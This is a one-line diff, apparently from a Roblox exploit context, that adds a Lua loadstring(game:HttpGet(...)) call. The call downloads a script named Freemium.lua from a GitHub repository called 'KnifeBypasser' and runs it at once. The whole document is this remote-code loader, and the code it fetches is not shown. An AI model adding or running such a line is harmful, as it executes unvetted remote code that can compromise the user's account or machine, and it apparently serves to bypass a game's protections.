@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SysgetaScripts/KnifeBypasser/refs/heads/main/Freemium.lua", true))()
